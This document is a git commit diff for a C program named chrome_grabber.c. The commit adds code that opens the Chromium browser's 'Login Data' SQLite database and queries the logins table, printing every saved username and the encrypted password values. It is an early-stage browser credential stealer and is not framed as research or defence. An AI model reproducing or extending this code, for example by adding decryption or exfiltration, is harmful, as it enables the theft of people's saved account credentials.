a209c07d16a7e855274e3f27fa7856172e8a197d
492citizen <492citizen@protonmail.com>
2021-05-12 13:56:34 +0200

    Added db call functionality

--- chrome_grabber.c
+++ chrome_grabber.c
@@ -2,17 +2,39 @@
 #include <sqlite3.h>
 #include <unistd.h>
 
-
+// *** F U N C T I O N   P R O T O T Y P E S ***
 char check_file_exists(char *file_path);
 
+// *** D B   P A T H S ***
 char db_path_chromium[] = "/home/me/.config/chromium/Default/Login Data";
 char db_path_chrome[] = "/home/me/.config/google-chrome/Default/Login Data";
 
+char *get_user_stmt = "SELECT username_value FROM logins;"; // fetches usernames from logins table
+char *get_pass_stmt = "SELECT password_value FROM logins;"; // fetches passwords from logins table
 
 FILE *out_file;
 
+static int user_callback(void *NotUsed, int argc, char **argv, char **azColName){
+	for(int i = 0; i<argc; i++){
+		printf("%s = %s\n", azColName[i], argv[i] ? argv[i] : "NULL");
+	}
+	printf("\n");
+	return 0;
+}
+
+static int pass_callback(void *NotUsed, int argc, char **argv, char **azColName){
+	for(int i = 0; i<argc; i++){
+		printf("Undecoded: %s = %s\n", azColName[i], argv[i] ? argv[i] : "NULL");
+	}
+	printf("\n");
+	return 0;
+
+}
+
 int main(void){
-	
+
+	char *zErrMsg = 0;
+
 	printf("Checking installed browsers...\n");
 	if(check_file_exists(&db_path_chromium)){
 		printf("Chromium is installed\n");
@@ -21,16 +43,13 @@ int main(void){
 		printf("Chrome is installed\n");
 	}
 
-	// get version (only used to verify that sqlite3 was included correctly)
-	printf("%s\n", sqlite3_libversion());
-
 	// create db handle
-	sqlite3 *db;
+	sqlite3 *db_chromium;
 
 	// make sql statement
 	sqlite3_stmt *res;
 
-	int status = sqlite3_open(":memory:", &db);
+	int status = sqlite3_open(db_path_chromium, &db_chromium);
 
 	if (status != SQLITE_OK){
 		printf("Error opening database\n");
@@ -39,10 +58,14 @@ int main(void){
 		printf("Database successfully opened\n");
 	}
 
+	printf("SQL open status: %i\n", status);
+
 
 	// compile a SQL statement and put it in 4th parameter
-	status = sqlite3_prepare_v2(db, "SELECT username_value FROM logins;", -1, &res, 0); // 2nd parameter is the statement
-	status = sqlite3_prepare_v2(db, "SELECT password_value FROM logins;", -1, &res, 0); // 2nd parameter is the statement
+	status = sqlite3_exec(db_chromium, get_user_stmt, user_callback, 0, &zErrMsg);
+	status = sqlite3_exec(db_chromium, get_pass_stmt, pass_callback, 0, &zErrMsg);
+
+	printf("SQL statement status: %i\n", status);
 
 	return 0;
 
